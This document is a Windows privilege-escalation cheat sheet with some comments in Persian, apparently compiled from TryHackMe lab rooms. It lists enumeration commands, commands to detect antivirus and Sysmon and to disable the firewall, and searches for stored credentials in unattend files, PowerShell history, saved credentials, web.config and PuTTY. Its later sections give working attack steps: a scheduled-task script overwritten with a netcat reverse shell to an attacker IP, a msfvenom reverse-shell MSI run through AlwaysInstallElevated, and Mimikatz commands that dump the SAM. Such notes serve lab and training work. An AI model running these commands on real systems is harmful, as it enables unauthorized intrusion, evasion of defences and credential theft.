# Enumeration ✅📚
## Basic-Enumeration ✅
```powershell
systeminfo        # اطلاعات سیستم و ویندوز
wmic os get Caption, Version, OSArchitecture # اطلاعات سیستم و ویندوز
--------------------------------------------------------------------------
# Sharing files and Printers Enumeration
net view \\TARGET-IP 
net use Z: \\TARGET-IP\SharedFolder
--------------------------------------------------------------------------
# User-Enumeration
whoami /priv      # بررسی سطح دسترسی
net user          # لیست یوزرهای سیستم
net localgroup administrators  # بررسی ادمین‌های محلی
Get-ADUser -Filter * # Find users in Active Directory
Get-ADUser -Filter * -SearchBase "DC=THMREDTEAM,DC=COM" # Find all users in a particular DC (Domain Component)
Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM" # Search users in a particular CN (Common Name)
Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM" # Find all users in a particular OU (Organizational Unit)
--------------------------------------------------------------------------
# Network-Enumeration
arp -a     # برسی جدول آرپ برای شناسایی دستگاه‌های دیگری که در شبکه فعال هستند
ipconfig /all     # بررسی اطلاعات شبکه
netstat -anot      # بررسی پورت‌های باز و اتصالات شبکه
netstat -ano | findstr :3366  # بررسی باز بودن یا نبودن یک پورت خاص 
--------------------------------------------------------------------------
# These tools are for gathering information and abusing common mistakes in Windows security configurations.
https://github.com/GhostPack/Seatbelt
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
```

## Host-Security-Enumeration ✅
```powershell
wmic /namespace:\\root\securitycenter2 path antivirusproduct # Antivirus Identification Method
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct # Antivirus Identification Method
Get-Service WinDefend # Check Windows Defender's status
Get-MpComputerStatus | select RealTimeProtectionEnabled # Check Windows Defender's (Real-time Protection)  status
Get-NetFirewallProfile | Format-Table Name, Enabled # Checking the Firewall Status in Windows
netsh advfirewall set allprofiles state off # disable the firewall on all profiles
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False # If we have admin access, we can disable the firewall on profiles
Get-NetFirewallRule | select DisplayName, Enabled, Description # Review of firewall rules
Get-NetFirewallRule | select DisplayName, Enabled, Description # Check of specific firewall rules
netsh advfirewall firewall show rule name=all | findstr /i "3366" # Checking a particular port in the firewall rules


Get-MpThreat # View threats identified by Microsoft Defender

Get-EventLog -List # Check the list of logs in the system

Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }  # Checking SysMon Installation on System
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"  # Checking SysMon Installation on System
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational  # Checking SysMon Installation on System
----------------------------------------------------------------
# If the hacker can access the Sysmon configuration file, he can find out what activities are being monitored and trying to erase his rejection!
findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\* 
----------------------------------------------------------------
# Check what are security software such as antivirus, EDR, or monitoring runs on the system with External tools
https://github.com/PwnDexter/Invoke-EDRChecker
https://github.com/PwnDexter/SharpEDRChecker
----------------------------------------------------------------
Test-NetConnection -ComputerName 127.0.0.1 -Port 80  # Check whether a particular port is open in firewall rules or not
$portRange = 80..90; $portRange | ForEach-Object { Test-NetConnection -ComputerName 127.0.0.1 -Port $_ } # Check whether a particular range ports are open in firewall rules or not

(New-Object System.Net.Sockets.TcpClient("127.0.0.1", "445")).Connected # برای تست اتصال به پورت 445 روی 127.0.0.1 
```

## Windows-Applications/Services-Enumeration ✅
```cmd
net start # لیست کردن سرویس‌های فعال در سیستم
wmic service where "name like 'THM Demo'" get Name,PathName #  پیدا کردن مسیر فایل اجرایی سرویس خاص
Get-Process -Name thm-demo # Checking Process activities associated with this service
# Note: Process ID (PID) This is useful for the next steps.

wmic product get name,version # چک کردن لیست همه‌ی نرم‌افزارهای نصب‌شده همراه با نسخه‌شون
tasklist          # لیست پردازش‌های فعال
tasklist | findstr <PID> 
wmic process list full  # نمایش تمام جزئیات پردازش‌ها
Get-ChildItem -Hidden -Path C:\Users\Public\  # لیست فایل‌های مخفی


sc qc apphostsvc # برسی جزئیات پیکربندی یک سرویس خاص
Get-SmbServerConfiguration # Check the SMB version running on a Windows system (in the internal network)
----------------------------------------------------------------
# Check DNS service (to analyze domain name on the network) 
> nslookup.exe # run tool
> server <IP-Dns-Server> # Set dns server
> ls -d thmredteam.com # Check DNS service (to analyze domain name on the network)

```

# Password History ✅
## File-Unattended ✅
### cmd ✡️
```powershell
dir C:\sysprep.inf /s /p
dir C:\sysprep.xml /s /p
dir C:\unattend.xml /s /p

Get-ChildItem -Path C:\ -Filter "sysprep.inf" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter "Unattend.xml" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\Panther\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\system32\sysprep\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
```
## Powershell History ✅
### cmd ✡️
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in cmd
```
### powershell ✡️
```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in powershell
```
## Saved Windows Credentials ✅
```powershell
cmdkey /list # show save user credentials
runas /savecred /user:<username> cmd.exe # run cmd with another user 
runas /savecred /user:<username> powershell.exe # run powershell with another user
```
## IIS Configuration ✅
```cmd
type C:\inetpub\wwwroot\web.config | findstr connectionString
forfiles /p C:\ /s /m web.config /c "cmd /c findstr /i connectionString @file" 2>$null
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
## Retrieve Credentials from Software: PuTTY ✅
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
# Abusing Service Misconfigurations ✅
## Scheduled Tasks ✅
```cmd
schtasks /query /tn vulntask /fo list /v  # target system
# ⬇️⬇️⬇️⬇️⬇️⬇️
# Folder: \
# HostName:                             THM-PC1
# TaskName:                             \vulntask
# Task To Run:                          C:\tasks\schtask.bat
# Run As User:                          taskusr1
------------------------------
icacls c:\tasks\schtask.bat # check the file permissions in target system 
------------------------------
echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat # target system
------------------------------
nc -lvnp 4444 # our kali
------------------------------
schtasks /run /tn vulntask # target system
```
## AlwaysInstallElevated ✅
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
------------------------------
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi # our kali
# transfer malicious.msi file to our kali # target system
------------------------------
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi # target system
```

## Strart-Powershell-With-Admin ✅
```powershell
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```

## Mimikatz-Command ✅
```powershell
privilege::debug # this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
token::elevate # simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges
lsadump::sam # list of password
```
